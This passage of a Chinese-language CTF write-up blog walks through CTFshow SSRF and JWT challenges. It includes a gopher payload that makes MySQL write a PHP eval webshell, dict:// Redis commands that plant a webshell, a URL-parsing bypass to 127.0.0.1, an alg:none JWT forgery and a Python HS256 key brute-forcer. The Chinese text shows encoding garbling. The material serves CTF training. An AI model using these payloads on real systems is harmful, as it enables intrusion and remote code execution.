class-name">FILTER_FLAG_NO_RES_RANGE</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'ip!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'scheme'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span> scheme</code></pre><ol><li><code>$ip = gethostbyname($x[&#39;host&#39;]);</code>Ôºö‰ΩøÁî®<code>gethostbyname</code>ÂáΩÊï∞Ëé∑ÂèñURL‰∏ªÊú∫ÂêçÂØπÂ∫îÁöÑIPÂú∞ÂùÄ„ÄÇ</li><li><code>if(!filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE)) &#123;</code>Ôºö‰ΩøÁî®<code>filter_var</code>ÂáΩÊï∞ÂíåÁõ∏Â∫îÁöÑËøáÊª§Âô®Ê£ÄÊü•IPÂú∞ÂùÄÊòØÂê¶ÊúâÊïàÔºåÂπ∂‰∏î‰∏çÊòØÁßÅÊúâÂú∞ÂùÄÊàñ‰øùÁïôÂú∞ÂùÄ„ÄÇÂ¶ÇÊûúIPÂú∞ÂùÄÊó†ÊïàÔºåÂ∞ÜÊâßË°å<code>die(&#39;ip!&#39;);</code>ÁªàÊ≠¢ËÑöÊú¨ÊâßË°å„ÄÇ</li></ol><ul><li><code>filter_var</code>ÔºöËøôÊòØPHPÂÜÖÁΩÆÁöÑÂáΩÊï∞ÔºåÁî®‰∫éËøáÊª§ÂèòÈáèÂπ∂ËøõË°åÈ™åËØÅ„ÄÇÂÆÉÊé•Âèó‰∏§‰∏™ÂèÇÊï∞ÔºöÁ¨¨‰∏Ä‰∏™ÊòØË¶ÅÈ™åËØÅÁöÑÂèòÈáèÔºåÁ¨¨‰∫å‰∏™ÊòØËøáÊª§ÈÄâÈ°π„ÄÇ</li><li><code>FILTER_VALIDATE_IP</code>ÔºöËøôÊòØ‰∏Ä‰∏™Áî®‰∫é <code>filter_var</code> ÁöÑÈÄâÈ°πÔºåÁî®Êù•È™åËØÅÊèê‰æõÁöÑÂèòÈáèÊòØÂê¶ÊòØ‰∏Ä‰∏™ÊúâÊïàÁöÑIPÂú∞ÂùÄ„ÄÇ</li><li><code>FILTER_FLAG_NO_PRIV_RANGE</code>ÔºöËøôÊòØ‰∏Ä‰∏™ÂèØÈÄâÁöÑÊ†áÂøóÔºåÁî®Êù•ÊéíÈô§ÁßÅÊúâIPÂú∞ÂùÄËåÉÂõ¥„ÄÇÁßÅÊúâIPÂú∞ÂùÄÈÄöÂ∏∏Áî®‰∫éÂÜÖÈÉ®ÁΩëÁªúÔºåÂπ∂‰∏çÂú®‰∫íËÅîÁΩë‰∏äË∑ØÁî±„ÄÇËøô‰∫õÂú∞ÂùÄÂåÖÊã¨‰ª•‰∏ãËåÉÂõ¥Ôºö</li><li><ul><li><code>10.0.0.0</code> Âà∞ <code>10.255.255.255</code></li><li><code>172.16.0.0</code> Âà∞ <code>172.31.255.255</code></li><li><code>192.168.0.0</code> Âà∞ <code>192.168.255.255</code></li></ul></li><li><code>FILTER_FLAG_NO_RES_RANGE</code>ÔºöËøôÊòØÂè¶‰∏Ä‰∏™ÂèØÈÄâÁöÑÊ†áÂøóÔºåÁî®Êù•ÊéíÈô§‰øùÁïôÁöÑIPÂú∞ÂùÄËåÉÂõ¥„ÄÇ‰øùÁïôÁöÑIPÂú∞ÂùÄÈÄöÂ∏∏‰∏çÂàÜÈÖçÁªôÁâπÂÆöÁöÑÁΩëÁªúËÆæÂ§áÔºåËÄåÁî®‰∫éÁâπÊÆäÁî®ÈÄîÔºåÂ¶ÇÂ§öÊí≠Âú∞ÂùÄ„ÄÇ</li><li><code>$ip</code>ÔºöËøôÊòØË¶ÅÈ™åËØÅÁöÑIPÂú∞ÂùÄÂèòÈáè„ÄÇ</li><li><code>if(!filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE))</code>ÔºöËøôÊù° <code>if</code> ËØ≠Âè•Ê£ÄÊü• <code>$ip</code> ÊòØÂê¶ÈÄöËøá‰∫ÜÈ™åËØÅ„ÄÇÂ¶ÇÊûú <code>$ip</code> ‰∏çÊòØ‰∏Ä‰∏™ÊúâÊïàÁöÑIPÂú∞ÂùÄÔºåÊàñËÄÖÊòØ‰∏Ä‰∏™ÁßÅÊúâÊàñ‰øùÁïôÁöÑIPÂú∞ÂùÄÔºå<code>filter_var</code> Â∞ÜËøîÂõû <code>false</code>ÔºåÁÑ∂ÂêéÊâßË°å <code>if</code> ËØ≠Âè•ÂùóÂÜÖÁöÑ‰ª£Á†Å„ÄÇ</li></ul><p>Âà©Áî®302Ë∑≥ËΩ¨ÂíådnsÈáçÁªëÂÆöÈÉΩÂèØ‰ª•„ÄÇ<br>Âú®Ëá™Â∑±ÊúçÂä°Âô®‰∏äÂÜô‰∏™index.phpÊñá‰ª∂ÂÜÖÂÆπÂ¶Ç‰∏ã</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Location:http://127.0.0.1/flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> </span></code></pre><p>PayloadÔºö</p><pre class="language-php" data-language="php"><code class="language-php">http<span class="token punctuation">:</span><span class="token comment">//xxx.xxx.xxx.xx/xxx.php</span></code></pre><h4 id="web358-127-0-0-1"><a href="#web358-127-0-0-1" class="headerlink" title="web358(@127.0.0.1)"></a>web358(@127.0.0.1)</h4><pre class="language-php" data-language="php"><code class="language-php"> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$url</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$x</span><span class="token operator">=</span><span class="token function">parse_url</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/^http:\/\/ctf\..*show$/i'</span><span class="token punctuation">,</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span></code></pre><p>Ê≠£ÂàôË°®ËææÂºèÁöÑÊÑèÊÄùÊòØ‰ª•<a href="http://ctf./">http://ctf.</a>ÂºÄÂ§¥Ôºå‰ª•showÁªìÂ∞æ„ÄÇ</p><p>‰ª•showÁªìÂ∞æÊØîËæÉÂ•ΩÂäûÔºåË¶Å‰πà#showÔºåË¶Å‰πà?a&#x3D;showËøôÊ†∑ÁöÑÈÉΩÂèØ‰ª•„ÄÇ</p><p>‰ª•<a href="http://ctf.ÂºÄÂ§¥ÁöÑËØùÔºåÂä†‰∏ä‰∏Ä‰∏™@127.0.0.1Â∞±ÂèØ‰ª•ÁªïËøá‰∫ÜÔºåËøôÊ†∑parse_urlËß£ÊûêÂá∫Êù•ÁöÑhostÊòØ127.0.0.1ÔºåËÄÉËôëÂà∞ftpÔºö">http://ctf.ÂºÄÂ§¥ÁöÑËØùÔºåÂä†‰∏ä‰∏Ä‰∏™@127.0.0.1Â∞±ÂèØ‰ª•ÁªïËøá‰∫ÜÔºåËøôÊ†∑parse_urlËß£ÊûêÂá∫Êù•ÁöÑhostÊòØ127.0.0.1ÔºåËÄÉËôëÂà∞ftpÔºö</a></p><p><a href="ftp://user[:pass]@ip[:port]/pathÔºåÂõ†Ê≠§ÂâçÈù¢ÁöÑctf.‰ºöË¢´Ëß£ÊûêÊàêuser„ÄÇ">ftp://user[:pass]@ip[:port]/pathÔºåÂõ†Ê≠§ÂâçÈù¢ÁöÑctf.‰ºöË¢´Ëß£ÊûêÊàêuser„ÄÇ</a></p><p>Payload:</p><pre class="language-php" data-language="php"><code class="language-php">url<span class="token operator">=</span>http<span class="token punctuation">:</span><span class="token comment">//ctf.@127.0.0.1/flag.php#show</span></code></pre><h4 id="web359-mysql-gopherus"><a href="#web359-mysql-gopherus" class="headerlink" title="web359(mysql gopherus)"></a>web359(mysql gopherus)</h4><p>Hint:ÊâìÊó†ÂØÜÁ†ÅÁöÑmysql</p><p><a href="https://blog.csdn.net/qq_41107295/article/details/103026470">SSRFÂà©Áî® Gopher ÂçèËÆÆÊãìÂ±ïÊîªÂáªÈù¢</a></p><p><a href="https://blog.csdn.net/crisprx/article/details/104251284">SSRFÂà©Áî® Gopher |GopherÊîªÂáªmysqlÂèäÂÜÖÁΩë</a></p><p><img src="web359.png" loading="lazy"></p><pre class="language-php" data-language="php"><code class="language-php">gopher<span class="token punctuation">:</span><span class="token comment">//127.0.0.1:3306/_%a3%00%00%01%85%a6%ff%01%00%00%00%01%21%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%72%6f%6f%74%00%00%6d%79%73%71%6c%5f%6e%61%74%69%76%65%5f%70%61%73%73%77%6f%72%64%00%66%03%5f%6f%73%05%4c%69%6e%75%78%0c%5f%63%6c%69%65%6e%74%5f%6e%61%6d%65%08%6c%69%62%6d%79%73%71%6c%04%5f%70%69%64%05%32%37%32%35%35%0f%5f%63%6c%69%65%6e%74%5f%76%65%72%73%69%6f%6e%06%35%2e%37%2e%32%32%09%5f%70%6c%61%74%66%6f%72%6d%06%78%38%36%5f%36%34%0c%70%72%6f%67%72%61%6d%5f%6e%61%6d%65%05%6d%79%73%71%6c%45%00%00%00%03%73%65%6c%65%63%74%20%22%3c%3f%70%68%70%20%65%76%61%6c%28%24%5f%50%4f%53%54%5b%30%5d%29%3b%3f%3e%22%20%69%6e%74%6f%20%6f%75%74%66%69%6c%65%20%22%2f%76%61%72%2f%77%77%77%2f%68%74%6d%6c%2f%31%2e%70%68%70%22%01%00%00%00%01</span></code></pre><p>Êää<code>_</code>ÂêéÁöÑÂÜçËøõË°å‰∏ÄÊ¨°urlÁºñÁ†Å</p><p>Payload:</p><pre class="language-php" data-language="php"><code class="language-php">gopher<span class="token punctuation">:</span><span class="token comment">//127.0.0.1:3306/_%25a3%2500%2500%2501%2585%25a6%25ff%2501%2500%2500%2500%2501%2521%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2572%256f%256f%2574%2500%2500%256d%2579%2573%2571%256c%255f%256e%2561%2574%2569%2576%2565%255f%2570%2561%2573%2573%2577%256f%2572%2564%2500%2566%2503%255f%256f%2573%2505%254c%2569%256e%2575%2578%250c%255f%2563%256c%2569%2565%256e%2574%255f%256e%2561%256d%2565%2508%256c%2569%2562%256d%2579%2573%2571%256c%2504%255f%2570%2569%2564%2505%2532%2537%2532%2535%2535%250f%255f%2563%256c%2569%2565%256e%2574%255f%2576%2565%2572%2573%2569%256f%256e%2506%2535%252e%2537%252e%2532%2532%2509%255f%2570%256c%2561%2574%2566%256f%2572%256d%2506%2578%2538%2536%255f%2536%2534%250c%2570%2572%256f%2567%2572%2561%256d%255f%256e%2561%256d%2565%2505%256d%2579%2573%2571%256c%2545%2500%2500%2500%2503%2573%2565%256c%2565%2563%2574%2520%2522%253c%253f%2570%2568%2570%2520%2565%2576%2561%256c%2528%2524%255f%2550%254f%2553%2554%255b%2530%255d%2529%253b%253f%253e%2522%2520%2569%256e%2574%256f%2520%256f%2575%2574%2566%2569%256c%2565%2520%2522%252f%2576%2561%2572%252f%2577%2577%2577%252f%2568%2574%256d%256c%252f%2531%252e%2570%2568%2570%2522%2501%2500%2500%2500%2501</span></code></pre><p>ÊúÄÂêéËÆøÈóÆ1.phpËøõË°åRCEÂç≥ÂèØ</p><h4 id="web360-redis"><a href="#web360-redis" class="headerlink" title="web360(redis)"></a>web360(redis)</h4><pre class="language-php" data-language="php"><code class="language-php"> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$url</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$ch</span><span class="token operator">=</span><span class="token function">curl_init</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_HEADER</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_RETURNTRANSFER</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$result</span><span class="token operator">=</span><span class="token function">curl_exec</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">curl_close</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span> </code></pre><p>ssrfÊâìredisÔºåÂü∫Êú¨‰∏äÂõõÁßçÊîªÂáªÊñπÂºèÔºö</p><ul><li>ÂÜôwebshell</li><li>ÂÜôsshÂÖ¨Èí•</li><li>ÂÜôcontrabËÆ°Âàí‰ªªÂä°ÂèçÂºπshell</li><li>‰∏ª‰ªéÂ§çÂà∂</li></ul><p>ËøôÈ¢òËÇØÂÆöÊòØÂÜôshell‰∫ÜÔºåÂÖàÂà©Áî®dictÊé¢Êµã‰∏Ä‰∏ãÁ´ØÂè£ÔºåÁúãÁúã6379Â≠ò‰∏çÂ≠òÂú®ÔºåÂ¶ÇÊûúÁõÆÊ†áÁöÑredisÊç¢Á´ØÂè£‰∫ÜÔºåÂ∞±Âà©Áî®dictÂçèËÆÆÊù•Êé¢ÊµãÔºö</p><p><img src="web360.png" loading="lazy"></p><p><a href="https://xz.aliyun.com/t/5665?time__1311=n4+xni5mqYqQw4CqGNDQTbm2+G8febDBmGoD">ÊµÖÊûêRedis‰∏≠SSRFÁöÑÂà©Áî®</a></p><p><a href="https://blog.csdn.net/rfrder/article/details/113853929">CTFshow ssrf</a></p><pre class="language-php" data-language="php"><code class="language-php"># ËÆæÁΩÆ‰∏Ä‰∏ãdirÔºåÂç≥Êú¨Âú∞Êï∞ÊçÆÂ∫ìÂ≠òÊîæÁõÆÂΩïÔºödict://127.0.0.1:6379/config:set:dir:/var/www/html# ÂÜôÈ©¨ÔºåÂèØËÉΩ‰ºöÊúâËΩ¨‰πâÊàñËÄÖËøáÊª§ÁöÑÊÉÖÂÜµÔºåÊâÄ‰ª•Áî®16ËøõÂà∂‰∏ÄËà¨ÈÉΩËÉΩÂÜôÊàêÂäü„ÄÇ# <span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span>dict://127.0.0.1:6379/set:shell:"\x3c\x3f\x70\x68\x70\x20\x65\x76\x61\x6c\x28\x24\x5f\x50\x4f\x53\x54\x5b\x30\x5d\x29\x3b\x3f\x3e"# ËÆæÁΩÆÊñá‰ª∂dict://127.0.0.1:6379/config:set:dbfilename:hsad.php# ‰øùÂ≠òdict://127.0.0.1:6379/save# ËÆøÈóÆhsad.phpËøõË°årce</code></pre><p>ÂΩìÁÑ∂‰πüÂèØ‰ª•‰ΩøÁî®gopherus</p>]]></content>
      
      
      <categories>
          
          <category> ÂÆâÂÖ®Áõ∏ÂÖ≥ </category>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTFshow </tag>
            
            <tag> ssrf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>webÂÖ•Èó®-JWT</title>
      <link href="/2024/07/27/web%E5%85%A5%E9%97%A8-JWT/"/>
      <url>/2024/07/27/web%E5%85%A5%E9%97%A8-JWT/</url>
      
        <content type="html"><![CDATA[<h3 id="JWTÊµÖÊûê"><a href="#JWTÊµÖÊûê" class="headerlink" title="JWTÊµÖÊûê"></a>JWTÊµÖÊûê</h3><p>JWTÂç≥JSON WEB TOKENÔºåÁî±‰∏â‰∏™ÈÉ®ÂàÜÁªÑÊàêÔºåÂπ∂Áî®‰∏§‰∏™‚Äú.‚ÄùËøõË°åËøûÊé•„ÄÇÁ¨¨‰∏ÄÈÉ®ÂàÜ‰∏∫headerÔºàbase64Âä†ÂØÜÔºâÔºåÁ¨¨‰∫åÈÉ®ÂàÜ‰∏∫payloadÔºàbase64Âä†ÂØÜÔºâÔºåÁ¨¨‰∏âÈÉ®ÂàÜ‰∏∫verify signatureÔºåÂÆÉÁöÑÊûÑÊàêÂ¶Ç‰∏ãÔºö</p><p><img src="begin.png" loading="lazy"></p><p>HEADER‰∏≠algÂØπÂ∫îÁöÑÂä†ÂØÜÊñπÂºè‰∏∫HS256Ôºå‰πüÂèØ‰ª•ÈÄâÊã©ÂÖ∂‰ªñÂØπÁß∞ÊàñÈùûÂØπÁß∞ÁöÑÂä†ÂØÜÊñπÂºèÔºåÂ§ßÂêåÂ∞èÂºÇ„ÄÇ</p><p>PAYLOAD‰∏≠‰∏ÄËà¨ÂåÖÊã¨Áî®Êà∑‰ø°ÊÅØ„ÄÇ</p><p>Verify Signature‰∏≠ÂåÖÊã¨Âä†ÂØÜÁöÑÂØÜÁ†Å„ÄÇ</p><p>JWTÊú¨Ë¥®‰∏äÊòØ‰∏ÄÁßçÊ†°È™åÂÄºÔºåÁî®Êù•È™åËØÅË∫´‰ªΩÂíåÊï∞ÊçÆÊòØÂê¶Ë¢´Êõ¥Êîπ„ÄÇ</p><h3 id="web345-350"><a href="#web345-350" class="headerlink" title="web345-350"></a>web345-350</h3><h4 id="web345-none"><a href="#web345-none" class="headerlink" title="web345(none)"></a>web345(none)</h4><p>Êü•ÁúãÊ∫êÁ†ÅÂæóÂà∞Hint<code>/admin</code></p><p>ËÆøÈóÆÂêéÊäìÂåÖÁúãÂà∞cookie</p><pre class="language-http" data-language="http"><code class="language-http"><span class="token header"><span class="token header-name keyword">Cookie</span><span class="token punctuation">:</span> <span class="token header-value">auth=eyJhbGciOiJOb25lIiwidHlwIjoiand0In0.W3siaXNzIjoiYWRtaW4iLCJpYXQiOjE3MjIwNTgwNTksImV4cCI6MTcyMjA2NTI1OSwibmJmIjoxNzIyMDU4MDU5LCJzdWIiOiJ1c2VyIiwianRpIjoiMzQ4NWJkNjFmY2MwZjFhNjY4NDNhYzlhYTBhMzZjNzEifV0</span></span></code></pre><p>Áî®<code>.</code>Â∞ÜÂÖ∂ÂàÜ‰∏∫‰∏§ÂçäÂàÜÂà´base64Ëß£Á†Å</p><pre class="language-php" data-language="php"><code class="language-php">eyJhbGciOiJOb25lIiwidHlwIjoiand0In0 <span class="token operator">--</span><span class="token operator">></span>  <span class="token punctuation">&#123;</span><span class="token string double-quoted-string">"alg"</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"None"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"typ"</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"jwt"</span><span class="token punctuation">&#125;</span>W3siaXNzIjoiYWRtaW4iLCJpYXQiOjE3MjIwNTgwNTksImV4cCI6MTcyMjA2NTI1OSwibmJmIjoxNzIyMDU4MDU5LCJzdWIiOiJ1c2VyIiwianRpIjoiMzQ4NWJkNjFmY2MwZjFhNjY4NDNhYzlhYTBhMzZjNzEifV0  <span class="token operator">--</span><span class="token operator">></span><span class="token punctuation">[</span><span class="token punctuation">&#123;</span><span class="token string double-quoted-string">"iss"</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"admin"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"iat"</span><span class="token punctuation">:</span><span class="token number">1722058059</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"exp"</span><span class="token punctuation">:</span><span class="token number">1722065259</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"nbf"</span><span class="token punctuation">:</span><span class="token number">1722058059</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"sub"</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"user"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"jti"</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"3485bd61fcc0f1a66843ac9aa0a36c71"</span><span class="token punctuation">&#125;</span><span class="token punctuation">]</span></code></pre><p>ÁÑ∂ÂêéÂ∞ÜÂêéÂçäÈÉ®ÂàÜÊîπ‰∏∫<code>[&#123;&quot;sub&quot;:&quot;admin&quot;&#125;]</code>base64ÁºñÁ†ÅÂêé‰∏éÁ¨¨‰∏ÄÈÉ®ÂàÜÊãºÊé•</p><pre class="language-http" data-language="http"><code class="language-http">eyJhbGciOiJOb25lIiwidHlwIjoiand0In0A.W3sic3ViIjoiYWRtaW4ifV0</code></pre><p>ÂèëÈÄÅÂæóÂà∞flag</p><h4 id="web346-348-HS256"><a href="#web346-348-HS256" class="headerlink" title="web346-348(HS256)"></a>web346-348(HS256)</h4><p>ËøôÊ¨°‰ΩøÁî®‰∫ÜHS256Âä†ÂØÜÔºå‰∏ªË¶ÅÂ∞±ÊòØÁàÜÁ†¥keyÔºåÁΩë‰∏äÊúâÂæàÂ§öÊñπÊ≥ïÔºåËøôÈáåÊàë‰ΩøÁî®ÁöÑÊòØ<a href="https://github.com/Aiyflowers/JWT_GUI">JWT_GUI</a></p><p><img src="web346.png" loading="lazy"></p><pre class="language-http" data-language="http"><code class="language-http">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJhZG1pbiIsImlhdCI6MTcyMjA2MjAzMSwiZXhwIjoxNzIyMDY5MjMxLCJuYmYiOjE3MjIwNjIwMzEsInN1YiI6ImFkbWluIiwianRpIjoiNjUwZWVkZWVjNDAwYTA2ZTAxNWM1NjUzOWNkMmY5MTAifQ.Q2JT2tqgC8JogIjUH6PNNQN3_MY3QmDp8LK6aBj7Pfs</code></pre><p>ËøôÈáå‰πüÊúâpyÁàÜÁ†¥ËÑöÊú¨</p><pre class="language-python" data-language="python"><code class="language-python">python <span class="token punctuation">.</span><span class="token operator">/</span>pydictor<span class="token punctuation">.</span>py <span class="token operator">-</span>base d <span class="token operator">-</span><span class="token operator">-</span><span class="token builtin">len</span> <span class="token number">1</span> <span class="token number">6</span> <span class="token operator">-</span>o nums1_6<span class="token punctuation">.</span>txt</code></pre><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> jwt<span class="token keyword">import</span> json<span class="token keyword">def</span> <span class="token function">runblasting</span><span class="token punctuation">(</span>path<span class="token punctuation">,</span>jwt_str<span class="token punctuation">,</span>alg<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> alg <span class="token operator">==</span> <span class="token string">"none"</span><span class="token punctuation">:</span>        alg <span class="token operator">=</span> <span class="token string">"HS256"</span>    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>path<span class="token punctuation">,</span>encoding<span class="token operator">=</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>        <span class="token keyword">for</span> line <span class="token keyword">in</span> f<span class="token punctuation">:</span>            key_ <span class="token operator">=</span> line<span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'use '</span><span class="token operator">+</span>key_<span class="token punctuation">)</span>            <span class="token keyword">try</span><span class="token punctuation">:</span>                jwt<span class="token punctuation">.</span>decode<span class="token punctuation">(</span>jwt_str<span class="token punctuation">,</span>verify<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span>key<span class="token operator">=</span>key_<span class="token punctuation">,</span>algorithms<span class="token operator">=</span>alg<span class="token punctuation">)</span>                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'found key! -->'</span> <span class="token operator">+</span> key_<span class="token punctuation">)</span>                <span class="token keyword">break</span>            <span class="token keyword">except</span><span class="token punctuation">(</span>jwt<span class="token punctuation">.</span>exceptions<span class="token punctuation">.</span>ExpiredSignatureError<span class="token punctuation">,</span> jwt<span class="token punctuation">.</span>exceptions<span class="token punctuation">.</span>InvalidAudienceError<span class="token punctuation">,</span>jwt<span class="token punctuation">.</span>exceptions<span class="token punctuation">.</span>InvalidIssuedAtError<span class="token punctuation">)</span><span class="token punctuation">:</span>                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'found key! -->'</span> <span class="token operator">+</span> key_<span class="token punctuation">)</span>                <span class="token keyword">break</span>            <span class="token keyword">except</span><span class="token punctuation">(</span>jwt<span class="token punctuation">.</span>exceptions<span class="token punctuation">.</span>InvalidSignatureError<span class="token punctuation">)</span><span class="token punctuation">:</span>                <span class="token keyword">continue</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"key not found!"</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    path <span class="token operator">=</span> <span class="token string">'./nums1_6.txt'</span>    jwt_str <span class="token operator">=</span> <span class="token string">"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJhZG1pbiIsImlhdCI6MTYzMjY2NzAxMywiZXhwIjoxNjMyNjc0MjEzLCJuYmYiOjE2MzI2NjcwMTMsInN1YiI6InVzZXIiLCJqdGkiOiIyNzM3NjJhOWU1NjZhMmIzNDJhYjUxN2VjNDNiOWY5YSJ9.4sf78nrf_g84F9m0Bpgbvn8fC1YkECCFZPd5U9tULYg"</span>    alg <span class="token operator">=</span> <span class="token string">'HS256'</span>    runblasting<span class="token punctuation">(</span>path<span class="token punctuation">,</span>jwt_str<span class="token punctuation">,</span>alg<span class="token punctuation">)</span></code></pre><p>348 key : aabb</p><h4 id="web349-RS256"><a href="#web349-RS256" class="headerlink" title="web349(RS256)"></a>web349(RS256)</h4><p>Hint:</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">// app.js</span><span class="token comment">/* GET home page. */</span>router<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res<span class="token punctuation">,</span> next</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  res<span class="token punctuation">.</span><span class="token function">type</span><span class="token punctuation">(</span><span class="token string">'html'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">var</span> privateKey <span class="token operator">=</span> fs<span class="token punctuation">.</span><span class="token function">readFileSync</span><span class="token punctuation">(</span>process<span class="token punctuation">.</span><span class="token function">cwd</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'//public//private.key'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">var</span> token <span class="token operator">=</span> jwt<span class="token punctuation">.</span><span class="token function">sign</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span> <span class="token literal-property property">user</span><span class="token operator">:</span> <span class="token string">'user'</span> <span class="token punctuation">&#125;</span><span class="token punctuation">,</span> privateKey<span class="token punctuation">,</span> <span class="token punctuation">&#123;</span> <span class="token literal-property property">algorithm</span><span class="token operator">:</span> <span class="token string">'RS256'</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  res<span class="token punctuation">.</span><span class="token function">cookie</span><span class="token punctuation">(</span><span class="token string">'auth'</span><span class="token punctuation">,</span>token<span class="token punctuation">)</span><span class="token punctuation">;</span>  res<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token string">'where is flag?'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>router<span class="token punctuation">.</span><span class="token function">post</span><span class="token 